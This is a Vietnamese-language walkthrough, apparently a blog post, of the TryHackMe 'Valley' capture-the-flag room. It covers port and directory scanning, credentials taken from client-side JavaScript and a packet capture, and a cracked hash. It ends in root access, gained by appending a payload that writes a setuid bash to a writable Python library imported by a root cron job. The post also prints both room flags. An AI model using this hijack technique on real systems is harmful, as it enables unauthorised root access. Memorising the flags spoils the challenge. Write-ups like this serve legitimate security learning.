---
layout: post
author: "Neo"
title: "Tryhackme - Valley"
date: "2023-07-23"
tags: [
    "tryhackme",
    "web",
    "linux",
	"ftp",
    "wireshark",
    "python",
    "cron"
]
categories: ctf
---

0. this unordered seed list will be replaced by toc as unordered list
{:toc}

[TryHackMe - Valley](https://tryhackme.com/room/valleype)

## Reconnaissance and Scanning

Quét nhẹ cái port

```python
PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c2:84:2a:c1:22:5a:10:f1:66:16:dd:a0:f6:04:62:95 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCf7Zvn7fOyAWUwEI2aH/k8AyPehxzzuNC1v4AAlhDa4Off4085gRIH/EXpjOoZSBvo8magsCH32JaKMMc59FSK4canP2I0VrXwkEX0F8PjA1TV4qgqXJI0zNVwFrfBORDdlCPNYiqRNFp1vaxTqLOFuHt5r34134yRwczxTsD4Uf9Z6c7Yzr0GV6NL3baGHDeSZ/msTiFKFzLTTKbFkbU4SQYc7jIWjl0ylQ6qtWivBiavEWTwkHHKWGg9WEdFpU2zjeYTrDNnaEfouD67dXznI+FiiTiFf4KC9/1C+msppC0o77nxTGI0352wtBV9KjTU/Aja+zSTMDxoGVvo/BabczvRCTwhXxzVpWNe3YTGeoNESyUGLKA6kUBfFNICrJD2JR7pXYKuZVwpJUUCpy5n6MetnonUo0SoMg/fzqMWw2nCZOpKzVo9OdD8R/ZTnX/iQKGNNvgD7RkbxxFK5OA9TlvfvuRUQQaQP7+UctsaqG2F9gUfWorSdizFwfdKvRU=
|   256 42:9e:2f:f6:3e:5a:db:51:99:62:71:c4:8c:22:3e:bb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNIiJc4hdfcu/HtdZN1fyz/hU1SgSas1Lk/ncNc9UkfSDG2SQziJ/5SEj1AQhK0T4NdVeaMSDEunQnrmD1tJ9hg=
|   256 2e:a0:a5:6c:d9:83:e0:01:6c:b9:8a:60:9b:63:86:72 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEZhkboYdSkdR3n1G4sQtN4uO3hy89JxYkizKi6Sd/Ky
80/tcp    open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-title: Site doesn't have a title (text/html).
37370/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
Service Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel
```

Kiểm tra qua port 37370 ftp với user mặc định nhưng không thu được kết quả gì, tôi chuyển qua port 80 với web service

Sau khi lướt qua 1 vòng trang web và không thấy có gì nổi bật, đơn thuần chỉ là 1 trang web html, tôi thử tìm các directory bằng __gobuster__

```python
┌──(root㉿kali)-[/home/kali]
└─# gobuster dir -u http://10.10.35.151/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -t 100
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.35.151/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/07/23 03:07:33 Starting gobuster in directory enumeration mode
===============================================================
/gallery              (Status: 301) [Size: 314] [--> http://10.10.35.151/gallery/]
/static               (Status: 301) [Size: 313] [--> http://10.10.35.151/static/]
/pricing              (Status: 301) [Size: 314] [--> http://10.10.35.151/pricing/]
Progress: 87623 / 87665 (99.95%)
===============================================================
2023/07/23 03:11:09 Finished
===============================================================
```

Với __gallery__ thì đây là nơi show ảnh, __static__ là nơi chứa các ảnh. Với __pricing__, trong này chứa 1 file *note.txt*

```python
J,
Please stop leaving notes randomly on the website
-RP
```

Điều này có nghĩa là trang web vẫn còn gì đó ở ngay front-end mà tôi chưa tìm ra.

Quay trở lại __gallery__, source web cho tôi thông tin về phần ảnh.

```python
<html>
<head>
<style>
div.gallery {
  margin: 5px;
  border: 1px solid #ccc;
  float: left;
  width: 500px;
}

div.gallery:hover {
  border: 1px solid #777;
}

div.gallery img {
  width: 100%;
  height: 30%;
}

div.desc {
  padding: 15px;
  text-align: center;
}
</style>
</head>
<body>
<button style="height:100px;width:200px" onclick="window.location.href = '/';"> Return Home </button>

<div class="gallery">
  <a target="_blank" href="/static/1">
    <img src="/static/1" alt="1" width="1200" height="800">
  </a>
  <div class="desc">Image taken of the rapids of the Potomac</div>
</div>
<div class="gallery">
  <a target="_blank" href="/static/2">
    <img src="/static/2" alt="2" width="1200" height="800">
  </a>
  <div class="desc">The stars, as bright as ever</div>
</div>
<div class="gallery">
  <a target="_blank" href="/static/3">
    <img src="/static/3" alt="3" width="1200" height="800">
  </a>
  <div class="desc">Picture taken of Blue lake at sunset</div>
</div>
<div class="gallery">
  <a target="_blank" href="/static/4">
    <img src="/static/4" alt="4" width="1200" height="800">
  </a>
  <div class="desc">Rocks reflecting the sunset</div>
</div>
<div class="gallery">
  <a target="_blank" href="/static/5">
    <img src="/static/5" alt="5" width="1200" height="800">
  </a>
  <div class="desc">Sunset can never be fully captured, but we sure can try</div>
</div>
<div class="gallery">
  <a target="_blank" href="/static/6">
    <img src="/static/6" alt="1" width="1200" height="800">
  </a>
  <div class="desc">Image taken of the Austrain Alps</div>
</div>
<div class="gallery">
  <a target="_blank" href="/static/7">
    <img src="/static/7" alt="1" width="1200" height="800">
  </a>
  <div class="desc">Image taken of a firework</div>
</div>
<div class="gallery">
  <a target="_blank" href="/static/8">
    <img src="/static/8" alt="1" width="1200" height="800">
  </a>
  <div class="desc">Snowcapped peaks below the moon</div>
</div>
<div class="gallery">
  <a target="_blank" href="/static/9">
    <img src="/static/9" alt="1" width="1200" height="800">
  </a>
  <div class="desc">Fire red sunset taken at just the right moment</div>
</div>
<div class="gallery">
  <a target="_blank" href="/static/10">
    <img src="/static/10" alt="1" width="1200" height="800">
  </a>
  <div class="desc">Mountain top view of Blue Lake</div>
</div>
<div class="gallery">
  <a target="_blank" href="/static/11">
    <img src="/static/11" alt="1" width="1200" height="800">
  </a>
  <div class="desc">Fog covered roads in the Mountains</div>
</div>
<div class="gallery">
  <a target="_blank" href="/static/12">
    <img src="/static/12" alt="1" width="1200" height="800">
  </a>
  <div class="desc">Fireside chats below the peaks</div>
</div>
<div class="gallery">
  <a target="_blank" href="/static/13">
    <img src="/static/13" alt="1" width="1200" height="800">
  </a>
  <div class="desc">European Castles</div>
</div>
<div class="gallery">
  <a target="_blank" href="/static/14">
    <img src="/static/14" alt="1" width="1200" height="800">
  </a>
  <div class="desc">Lakeside view of the Alps</div>
</div>
<div class="gallery">
  <a target="_blank" href="/static/15">
    <img src="/static/15" alt="1" width="1200" height="800">
  </a>
  <div class="desc">Sunset picture taken from the hillside</div>
</div>
<div class="gallery">
  <a target="_blank" href="/static/16">
    <img src="/static/16" alt="1" width="1200" height="800">
  </a>
  <div class="desc">Foggy mountainside</div>
</div>
<div class="gallery">
  <a target="_blank" href="/static/17">
    <img src="/static/17" alt="1" width="1200" height="800">
  </a>
  <div class="desc">The crossing of the lake towards the Alps</div>
</div>
<div class="gallery">
  <a target="_blank" href="/static/18">
    <img src="/static/18" alt="1" width="1200" height="800">
  </a>
  <div class="desc">Fun times with friends watching the orange sky</div>
</div>


</body>
</html>
```

Vậy là các ảnh được đánh số thứ tự và được lưu trong __static__, nhưng khi vào __static__ thì ở đây trống trơn, không có gì cả. Rất có thể trong này có chứa một cái gì đó khác ngoài 18 bức ảnh trên nên mới bị ẩn đi.

Tôi sẽ dùng __gobuster__ để thử tìm các dir bị ẩn đằng sau __static__

```python
┌──(root㉿kali)-[/home/kali]
└─# gobuster dir -u http://10.10.35.151/static/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -t 100
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.35.151/static/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/07/23 03:16:05 Starting gobuster in directory enumeration mode
===============================================================
/00                   (Status: 200) [Size: 127]
/3                    (Status: 200) [Size: 421858]
/11                   (Status: 200) [Size: 627909]
/5                    (Status: 200) [Size: 1426557]
```

Tôi có thêm path __/00__. Truy cập nó và tôi có vài dòng note

```python
dev notes from valleyDev:
-add wedding photo examples
-redo the editing on #4
-remove /dev1243224123123
-check for SIEM alerts
```

Tôi có 1 path mới là __/dev1243224123123__. Truy cập vào và tôi có 1 form đăng nhập. Thử vào xem source của nó

```python
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login</title>
  <link rel="stylesheet" href="style.css">
  <script defer src="dev.js"></script>
  <script defer src="button.js"></script>
</head>


<body>
  <main id="main-holder">
    <h1 id="login-header">Valley Photo Co. Dev Login</h1>
    
    <div id="login-error-msg-holder">
      <p id="login-error-msg">Invalid username <span id="error-msg-second-line">and/or password</span></p>
    </div>
    
    <form id="login-form">
      <input type="text" name="username" id="username-field" class="login-form-field" placeholder="Username">
      <input type="password" name="password" id="password-field" class="login-form-field" placeholder="Password">
      <input type="submit" value="Login" id="login-form-submit">
    </form>


    <button id="homeButton">Back to Homepage</button>
  
  </main>
</body>

</html>
```

Không có gì đặc biệt, tuy nhiên tôi để ý thấy có 1 script tên __dev.js__

```python
const loginForm = document.getElementById("login-form");
const loginButton = document.getElementById("login-form-submit");
const loginErrorMsg = document.getElementById("login-error-msg");

loginForm.style.border = '2px solid #ccc';
loginForm.style.padding = '20px';
loginButton.style.backgroundColor = '#007bff';
loginButton.style.border = 'none';
loginButton.style.borderRadius = '5px';
loginButton.style.color = '#fff';
loginButton.style.cursor = 'pointer';
loginButton.style.padding = '10px';
loginButton.style.marginTop = '10px';


function isValidUsername(username) {

	if(username.length < 5) {

	console.log("Username is valid");

	}
	else {

	console.log("Invalid Username");

	}

}

function isValidPassword(password) {

	if(password.length < 7) {

        console.log("Password is valid");

        }
        else {

        console.log("Invalid Password");

        }

}

function showErrorMessage(element, message) {
  const error = element.parentElement.querySelector('.error');
  error.textContent = message;
  error.style.display = 'block';
}

loginButton.addEventListener("click", (e) => {
    e.preventDefault();
    const username = loginForm.username.value;
    const password = loginForm.password.value;

    if (username === "siemDev" && password === "california") {
        window.location.href = "/dev1243224123123/devNotes37370.txt";
    } else {
        loginErrorMsg.style.opacity = 1;
    }
})
```

Ở phần cuối tôi có username và password, thêm cả 1 path mới. Truy cập vào nó và tôi có gợi ý tiếp theo

```python
dev notes for ftp server:
-stop reusing credentials
-check for any vulnerabilies
-stay up to date on patching
-change ftp port to normal port
```

ở đây có nhắc đến ftp. Tôi sẽ quay lại port ftp và thử dùng username và password phía trên để login

```python
┌──(root㉿kali)-[/home/kali/Downloads]
└─# ftp 10.10.35.151 37370
Connected to 10.10.35.151.
220 (vsFTPd 3.0.3)
Name (10.10.35.151:kali): siemDev
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||54959|)
150 Here comes the directory listing.
-rw-rw-r--    1 1000     1000         7272 Mar 06 13:55 siemFTP.pcapng
-rw-rw-r--    1 1000     1000      1978716 Mar 06 13:55 siemHTTP1.pcapng
-rw-rw-r--    1 1000     1000      1972448 Mar 06 14:06 siemHTTP2.pcapng
226 Directory send OK.
ftp> 
```

Tải 3 file pcap này về và dùng *__Wireshark__* để phân tích.

Sau một lúc khá lâu thì tôi đã tìm thấy thứ mình cần trong file __siemHTTP2.pcapng__

```python
POST /index.html HTTP/1.1
Host: 192.168.111.136
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 42
Origin: http://192.168.111.136
Connection: keep-alive
Referer: http://192.168.111.136/index.html
Upgrade-Insecure-Requests: 1

uname=valleyDev&psw=ph0t0s1234&remember=onHTTP/1.1 200 OK
Date: Mon, 06 Mar 2023 21:05:08 GMT
Server: Apache/2.4.55 (Debian)
Last-Modified: Mon, 06 Mar 2023 20:46:17 GMT
ETag: "2fc-5f64162f52399-gzip"
Accept-Ranges: bytes
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Length: 369
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html

...........RMO.0...WX..UpDi.Bp.0!qFI....$$.>.=I..m P........|c}.BQgM.:S.a.R...H..K.l V-.x..@i.Bl..e
.....X.9.^....	..n.L.@h*.c...al....\-.(~.k!QC.[....Y.e...../d...2.1n .........Baku.....z..3H...<~...:...va...Q....ob7u.J.>.G....Z.D.Lpa.}..x.Mg"s...g..D...V.C.}...Rxb..c/...m
..#..l.....:.I......o..../7......i<....F..dX....)..f..V.X.X.....)..U...x!.7...|^.'_...Q?.%....GET /img_avatar2.png HTTP/1.1
Host: 192.168.111.136
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: image/avif,image/webp,*/*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://192.168.111.136/index.html

HTTP/1.1 404 Not Found
Date: Mon, 06 Mar 2023 21:05:09 GMT
Server: Apache/2.4.55 (Debian)
Content-Length: 277
Keep-Alive: timeout=5, max=99
Connection: Keep-Alive
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.55 (Debian) Server at 192.168.111.136 Port 80</address>
</body></html>
```

## SSH

Thử nhập username và password này vào phần login trên trang web nhưng không được, vào ftp cũng không được. Vậy thì chỉ còn ssh trên port 22

```python
┌──(root㉿kali)-[/home/kali/Downloads]
└─# ssh valleyDev@10.10.35.151
The authenticity of host '10.10.35.151 (10.10.35.151)' can't be established.
ED25519 key fingerprint is SHA256:cssZyBk7QBpWU8cMEAJTKWPfN5T2yIZbqgKbnrNEols.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.35.151' (ED25519) to the list of known hosts.
valleyDev@10.10.35.151's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-139-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 * Introducing Expanded Security Maintenance for Applications.
   Receive updates to over 25,000 software packages with your
   Ubuntu Pro subscription. Free for personal use.

     https://ubuntu.com/pro
valleyDev@valley:~$ id
uid=1002(valleyDev) gid=1002(valleyDev) groups=1002(valleyDev)
valleyDev@valley:~$ 
```

__*user flag*__

```python
valleyDev@valley:~$ ls
user.txt
valleyDev@valley:~$ cat user.txt 
THM{k@l1_1n_th3_v@lley}
valleyDev@valley:~$ 
```

## Privilege escalation

```python
valleyDev@valley:/home$ ls -la
total 752
drwxr-xr-x  5 root      root        4096 Mar  6 13:19 .
drwxr-xr-x 21 root      root        4096 Mar  6 15:40 ..
drwxr-x---  4 siemDev   siemDev     4096 Mar 20 20:03 siemDev
drwxr-x--- 16 valley    valley      4096 Mar 20 20:54 valley
-rwxrwxr-x  1 valley    valley    749128 Aug 14  2022 valleyAuthenticator
drwxr-xr-x  6 valleyDev valleyDev   4096 Jul 23 08:20 valleyDev
valleyDev@valley:/home$ 
```

Ở đây có 1 file thực thi kiểm tra password cho username. Nhưng cho dù tôi có nhập đúng password của user nào thì nó vẫn ra kết quả sai

```python
valleyDev@valley:/home$ ./valleyAuthenticator 
Welcome to Valley Inc. Authenticator
What is your username: valleyDev
What is your password: ph0t0s1234
Wrong Password or Username
valleyDev@valley:/home$ 
```

Vậy rất có khả năng trong file thực thi này có chứa password và username khác mà tôi chưa biết. Vậy nên tôi sao chép nó về máy và phân tích 

```python
┌──(root㉿kali)-[/home/kali]
└─# strings valleyAuthenticator
```

Nó rất, rất dài. Sau 1 lúc kéo và xem hết nó một cách chi tiết thì tôi đã tìm được thứ mình cần

```python
e6722920bab2326f8217e4
bf6b1b58ac
ddJ1cc76ee3
beb60709056cfbOW
elcome to Valley Inc. Authentica
[k0rHh
 is your usernad
```

Dãy đầu tiên có thể là md5. Tôi sử dụng [crackstation](https://crackstation.net/) và tìm được password là *liberty123*. Thử với các user còn lại

```python
valleyDev@valley:~$ su valley
Password: 
valley@valley:~$ id
uid=1000(valley) gid=1000(valley) groups=1000(valley),1003(valleyAdmin)
valley@valley:~$ 
```

User này nằm trong 1 group khác là *valleyAdmin*. Tôi sẽ thử tìm các file thuộc group này xem có gì đặc biệt không

```python
valley@valley:~$ find / -type f -group valleyAdmin -ls 2>/dev/null
   263097     20 -rwxrwxr-x   1 root     valleyAdmin    20382 Mar 13 03:26 /usr/lib/python3.8/base64.py
valley@valley:~$ 
```

Vậy là tôi có 1 file thuộc sở hữu của *root* nhưng nằm trong group *valleyAdmin*. Vậy thì tôi sẽ thêm payload này vào file trên 

```python
import os; os.system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash")
```

Tuy nhiên để file này có thể chạy được, tôi cần hệ thống chạy 1 file python nào đó và có import thư viện base64. Và sau khi tìm kiếm 1 lúc thì tôi đã thấy nó trong phần *__crontab__*

```python
 Example of job definition:
 .---------------- minute (0 - 59)
 |  .------------- hour (0 - 23)
 |  |  .---------- day of month (1 - 31)
 |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
 |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
 |  |  |  |  |
 *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
1  *    * * *   root    python3 /photos/script/photosEncrypt.py
```

Điều này có nghĩa là *root* được đặt lịch để chạy tự động file *photosEncrypt.py*. Kiểm tra file này

```python
#!/usr/bin/python3
import base64
for i in range(1,7):
# specify the path to the image file you want to encode
        image_path = "/photos/p" + str(i) + ".jpg"

# open the image file and read its contents
        with open(image_path, "rb") as image_file:
          image_data = image_file.read()

# encode the image data in Base64 format
        encoded_image_data = base64.b64encode(image_data)

# specify the path to the output file
        output_path = "/photos/photoVault/p" + str(i) + ".enc"

# write the Base64-encoded image data to the output file
        with open(output_path, "wb") as output_file:
          output_file.write(encoded_image_data)
```

Có import base64. Vậy thì chỉ cần thêm payload phía trên vào file *base64.py* và chờ 1 lúc

```python
valley@valley:~$ echo 'import os; os.system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash")' >> /usr/lib/python3.8/base64.py
```

Kiểm tra lại thư mục */tmp*

```python
valley@valley:~$ ls -la /tmp/
total 1220
drwxrwxrwt 16 root      root         4096 Jul 23 09:57  .
drwxr-xr-x 21 root      root         4096 Mar  6 15:40  ..
-rwsr-sr-x  1 root      root      1183448 Jul 23 09:58  bash
drwxrwxrwt  2 root      root         4096 Jul 23 07:47  .font-unix
drwxrwxrwt  2 root      root         4096 Jul 23 07:47  .ICE-unix
srwxrwxr-x  1 valleyDev valleyDev       0 Jul 23 08:21 'rspdpxqzdi;uid=0;'
drwx------  2 root      root         4096 Jul 23 07:47  snap-private-tmp
drwx------  3 root      root         4096 Jul 23 07:47  systemd-private-205e6587105240bea60eba682b3af138-apache2.service-FOOpTi
drwx------  3 root      root         4096 Jul 23 09:54  systemd-private-205e6587105240bea60eba682b3af138-fwupd.service-U4qAGh
drwx------  3 root      root         4096 Jul 23 07:47  systemd-private-205e6587105240bea60eba682b3af138-ModemManager.service-drZerj
drwx------  3 root      root         4096 Jul 23 07:47  systemd-private-205e6587105240bea60eba682b3af138-systemd-logind.service-z7Rsth
drwx------  3 root      root         4096 Jul 23 07:47  systemd-private-205e6587105240bea60eba682b3af138-systemd-resolved.service-gQhb0h
drwx------  3 root      root         4096 Jul 23 07:47  systemd-private-205e6587105240bea60eba682b3af138-systemd-timesyncd.service-XtzeHg
drwx------  3 root      root         4096 Jul 23 09:54  systemd-private-205e6587105240bea60eba682b3af138-upower.service-2QJCNh
drwxrwxrwt  2 root      root         4096 Jul 23 07:47  .Test-unix
drwxrwxrwt  2 root      root         4096 Jul 23 07:47  VMwareDnD
drwxrwxrwt  2 root      root         4096 Jul 23 07:47  .X11-unix
drwxrwxrwt  2 root      root         4096 Jul 23 07:47  .XIM-unix
valley@valley:~$ 
```

Nó đây rồi

```python
valley@valley:~$ /tmp/bash -p
bash-5.0# id
uid=1000(valley) gid=1000(valley) euid=0(root) egid=0(root) groups=0(root),1000(valley),1003(valleyAdmin)
bash-5.0# cat /root/root.txt
THM{v@lley_0f_th3_sh@d0w_0f_pr1v3sc}
bash-5.0# 
```
